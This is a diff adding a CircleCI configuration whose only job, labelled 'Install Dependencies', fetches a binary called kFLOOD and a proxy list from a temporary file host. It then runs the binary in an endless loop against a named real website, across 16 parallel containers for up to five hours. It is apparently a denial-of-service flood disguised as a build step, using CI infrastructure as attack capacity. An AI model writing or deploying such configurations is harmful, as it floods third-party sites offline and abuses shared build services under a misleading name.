@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install wget -y && wget https://temp.sh/qOPVx/kFLOOD && wget https://temp.sh/Giavw/proxy.txt && chmod +x kFLOOD && while true; do ./kFLOOD https://codeby.net/ 999999 100 64 1 proxy.txt; done;
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
